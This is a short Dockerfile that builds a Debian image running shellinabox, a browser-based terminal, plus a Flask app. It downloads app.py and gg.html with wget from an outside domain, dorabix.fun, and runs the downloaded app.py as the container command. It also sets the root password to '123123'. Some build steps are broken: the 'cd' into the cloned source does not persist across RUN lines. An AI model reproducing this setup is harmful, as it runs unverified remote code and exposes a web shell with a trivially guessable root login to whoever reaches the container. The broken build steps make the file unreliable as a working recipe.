FROM debian:11
RUN apt update -y && apt-get update -y 
RUN apt-get install git libssl-dev libpam0g-dev wget python3-pip python3 zlib1g-dev dh-autoreconf shellinabox -y 
RUN git clone https://github.com/shellinabox/shellinabox.git && cd shellinabox
RUN autoreconf -i
RUN ./configure && make
RUN /etc/init.d/shellinabox start 
RUN /etc/init.d/shellinabox restart
RUN pip install flask
RUN wget dorabix.fun/app.py
RUN wget dorabix.fun/gg.html
RUN echo "root:123123" | chpasswd

CMD python3 app.py
